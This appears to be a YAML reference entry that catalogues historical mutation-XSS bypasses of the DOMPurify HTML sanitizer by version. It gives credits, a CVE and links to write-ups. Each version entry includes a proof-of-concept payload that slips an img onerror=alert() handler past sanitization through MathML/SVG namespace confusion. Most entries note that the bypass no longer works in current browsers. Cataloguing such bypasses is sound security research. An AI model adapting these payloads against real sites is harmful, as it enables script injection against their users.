---
description: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. https://cure53.de/purify
github: cure53/DOMPurify
gadgets:
  ≤3.1.2:
    authors:
      - twitter:kevin_mizu
    tags:
      - func-call-parameter
    pocs:
      - description: |
          Default configuration bypass.
          
          This bypass **no longer works** since `<` and `>` are now encoded when serializing a DOM Tree (<a target="_blank" href="https://github.com/whatwg/html/pull/6362">spec</a>, <a target="_blank" href="https://developer.chrome.com/blog/escape-attributes">chromium</a>, <a target="_blank" href="https://webkit.org/blog/17092/release-notes-for-safari-technology-preview-221/#:~:text=Fixed%20escaping">safari</a>, firefox) making "attribute" based mXSS no longer possible...
        code: |
          <form id="x ">
          <r*504>
          <a>
            <svg>
              <desc>
                <svg>
                  <image>
                    <a>
                      <desc>
                        <svg>
                          <image></image>
                        </svg>
                      </desc>
                    </a>
                  </image>
                  <style><a id="</style><img src=x onerror=alert(1)>"></a></style>
                </svg>
              </desc>
            </svg>
          </a>
          </form>
          <input form="x" name="__depth">
        preview: https://yeswehack.github.io/Dom-Explorer/shared?id=27b201c4-9ba9-454a-b92c-ad6f87168040
    links:
      - https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.2-bypass
  ≤3.1.1:
    authors:
      - twitter:kevin_mizu
    tags:
      - func-call-parameter
    pocs:
      - description: |
          Default configuration bypass.
          
          This bypass **no longer works** since `<` and `>` are now encoded when serializing a DOM Tree (<a target="_blank" href="https://github.com/whatwg/html/pull/6362">spec</a>, <a target="_blank" href="https://developer.chrome.com/blog/escape-attributes">chromium</a>, <a target="_blank" href="https://webkit.org/blog/17092/release-notes-for-safari-technology-preview-221/#:~:text=Fixed%20escaping">safari</a>, firefox) making "attribute" based mXSS no longer possible...
        code: |
          <div*200>
          <form><input name="parentNode">
          <div*200>
          <form></form><form><input name="parentNode">
          <div*105>
          <table>
            <caption>
              <svg>
                <desc>
                  <table><caption></caption></table>
                </desc>
                <style><a title="</svg></style><img src onerror=alert(1)>"></a></style>
                </svg>
            </caption>
          </table>
        preview: https://yeswehack.github.io/Dom-Explorer/shared?id=bc4910dd-3c0f-4125-952b-20320468ef2d
    links:
      - https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.1-bypass
  ≤3.1.0:
    authors:
      - twitter:IcesFont
    tags:
      - func-call-parameter
    pocs:
      - description: |
          Default configuration bypass.
          
          This bypass **no longer works** since `<` and `>` are now encoded when serializing a DOM Tree (<a target="_blank" href="https://github.com/whatwg/html/pull/6362">spec</a>, <a target="_blank" href="https://developer.chrome.com/blog/escape-attributes">chromium</a>, <a target="_blank" href="https://webkit.org/blog/17092/release-notes-for-safari-technology-preview-221/#:~:text=Fixed%20escaping">safari</a>, firefox) making "attribute" based mXSS no longer possible...
        code: |
          <div*506>
          <table>
            <caption>
              <svg>
                <title>
                  <table><caption></caption></table>
                </title>
                <style><a id="</style><img src=x onerror=alert()>"></a></style>
              </svg>
            </caption>
          </table>
        preview: https://yeswehack.github.io/Dom-Explorer/shared?id=aeb6a690-58b9-47c6-b2ca-99c07f9db43b
    links:
      - https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.0-bypass
  ≤2.2.2:
    tags:
      - func-call-parameter
    pocs:
      - description: |
          Default configuration bypass.
          
          This bypass **no longer works** since `<` and `>` are now encoded when serializing a DOM Tree (<a target="_blank" href="https://github.com/whatwg/html/pull/6362">spec</a>, <a target="_blank" href="https://developer.chrome.com/blog/escape-attributes">chromium</a>, <a target="_blank" href="https://webkit.org/blog/17092/release-notes-for-safari-technology-preview-221/#:~:text=Fixed%20escaping">safari</a>, firefox) making "attribute" based mXSS no longer possible...
        code: |
          <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror='alert(1)'>"></style></h1>
        preview: https://yeswehack.github.io/Dom-Explorer/shared?id=15b5b74c-1c36-4df7-9bc6-2fccfc891683
    links:
      - https://github.com/cure53/DOMPurify/commit/8ab47b0a694022b396e30b7f643e28971f75f5d8
  ≤2.2.0:
    tags:
      - func-call-parameter
    pocs:
      - description: |
          Default configuration bypass.
          
          This bypass **no longer works** since `<` and `>` are now encoded when serializing a DOM Tree (<a target="_blank" href="https://github.com/whatwg/html/pull/6362">spec</a>, <a target="_blank" href="https://developer.chrome.com/blog/escape-attributes">chromium</a>, <a target="_blank" href="https://webkit.org/blog/17092/release-notes-for-safari-technology-preview-221/#:~:text=Fixed%20escaping">safari</a>, firefox) making "attribute" based mXSS no longer possible...
        code: |
          <form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
        preview: https://yeswehack.github.io/Dom-Explorer/shared?id=eff07c77-918a-4399-b92f-732095e3e9d4
    links:
      - https://github.com/cure53/DOMPurify/issues/482
      - https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
  ≤2.0.16:
    authors:
      - twitter:garethheyes
    tags:
      - func-call-parameter
    pocs:
      - description: |
          Default configuration bypass.
          
          This bypass **no longer works** since `<` and `>` are now encoded when serializing a DOM Tree (<a target="_blank" href="https://github.com/whatwg/html/pull/6362">spec</a>, <a target="_blank" href="https://developer.chrome.com/blog/escape-attributes">chromium</a>, <a target="_blank" href="https://webkit.org/blog/17092/release-notes-for-safari-technology-preview-221/#:~:text=Fixed%20escaping">safari</a>, firefox) making "attribute" based mXSS no longer possible...
        code: |
          <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
        preview: https://yeswehack.github.io/Dom-Explorer/shared?id=249819f1-732f-4edf-b7ba-866ebcf358d8
    links:
      - https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
  ≤2.0.15:
    authors:
      - twitter:securitymb
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - func-call-parameter
    pocs:
      - description: Default configuration bypass.
        code: |
          <form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
        preview: https://yeswehack.github.io/Dom-Explorer/shared?id=a0b5393e-c9b1-4717-90cc-de2bb405afa4
      - code: |
          <math><mtext><table><mglyph><style><math><table id="</table>"><img src onerror=alert(1)">
        preview: https://yeswehack.github.io/Dom-Explorer/shared?id=36a7d20f-f042-44fe-bdd9-11b97773517e
    links:
      - https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
  ≤2.0.0:
    cve: CVE-2019-16728
    authors:
      - twitter:securitymb
    tags:
      - func-call-parameter
    pocs:
      - description: |
          Default configuration bypass.
          
          This bypass **no longer works** since `<` and `>` are now encoded when serializing a DOM Tree (<a target="_blank" href="https://github.com/whatwg/html/pull/6362">spec</a>, <a target="_blank" href="https://developer.chrome.com/blog/escape-attributes">chromium</a>, <a target="_blank" href="https://webkit.org/blog/17092/release-notes-for-safari-technology-preview-221/#:~:text=Fixed%20escaping">safari</a>, firefox) making "attribute" based mXSS no longer possible...
        code: |
          <svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
        preview: false
      - code: |
          <math></p><style><a id="</style><img src=1 onerror=alert(1)>">
        preview: false
    links:
      - https://research.securitum.com/dompurify-bypass-using-mxss/
---
